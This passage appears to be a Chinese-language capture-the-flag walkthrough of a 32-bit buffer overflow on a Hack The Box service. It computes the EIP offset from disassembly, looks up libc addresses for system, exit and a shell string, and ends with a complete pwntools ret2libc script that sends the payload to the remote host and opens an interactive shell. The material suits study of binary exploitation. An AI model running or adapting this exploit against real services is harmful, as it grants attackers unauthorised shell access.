现在我们可以通过此处的内容 计算 EIP 的大小了

公式为 减去esp（sub esp）到添加esp（add esp）之间的大小的和（到调用\_isoc99scanf@plt为止）

```
1.  `...`
    
2.  `0x000007d8 <+4>:    sub    $0xd4,%esp`
    
3.  `...`
    
4.  `0x000007ee <+26>:    sub    $0xc,%esp`
    
5.  `...`
    
6.  `0x000007fd <+41>:    add    $0x10,%esp`
    
7.  `0x00000800 <+44>:    sub    $0xc,%esp`
    
8.  `...`
    
9.  `0x0000080f <+59>:    add    $0x10,%esp`
    
10.  `...`
     
11.  `0x0000081a <+70>:    sub    $0xc,%esp`
     
12.  `...`
     
13.  `0x00000823 <+79>:    add    $0x10,%esp`
     
14.  `0x00000826 <+82>:    sub    $0x8,%esp`
     
15.  `...`
     
16.  `因此：0xd4 + 0xc - 0x10 + 0xc - 0x10 + 0xc - 0x10 + 0x8 = 0xd0 = 208`
     
```

所以 现在 需要覆盖的 EIP 的总大小为

208 + 4 = 212

接下来需要查找到 system、exit、/bin/sh 的地址

可通过 libc-search 脚本

  

system 地址 0xf7e4c060

exit 地址 0xf7e3faf0

/bin/sh的地址使用另外一个脚本查找

但这是SHELL的位置 /bin/sh 的地址还需要退后6位（多次使用发现效果不是特别好需要前后调整10位左右 才会成功）

手工查找地址：

(gdb) **print** &**exit**

$2 = ( \*) 0xf7e3faf0 <**exit**\>

0xf7f70a0f

  

可以看到/bin/sh的地址中有 0x0a 换行符 很明显的 坏字符

搜一下其他的

(gdb) find &**system**,+9999999,"sh"

  

就使用0xf7f6ddd5

结合现在的手上的信息

EIP 212

system 地址 0xf7e4c060

exit 地址 0xf7e3faf0

/bin/sh 地址 0xf7f6ddd5

可以通过该处溢出执行system(‘/bin/sh’) 了

脚本：

#script by ippsec

from pwn import \*

context(os="Linux", arch="i386")

HOST, PORT= "10.10.10.61", 32812

#EIP Overwrite @ 212

junk = "\\x90" \* 212

ret2libc = p32(0xf7e4c060) # system

ret2libc += p32(0xf7e3faf0) # exit

ret2libc += p32(0xf7f6ddd5) # sh

payload = junk + ret2libc

r=remote(HOST,PORT)

r.recvuntil("Enter Bridge Access Code:")

r.sendline("picarda1")

r.recvuntil("Waiting for input:")

r.sendline("4")

r.recvuntil("Enter Security Override:")

r.sendline(payload)

r.interactive()
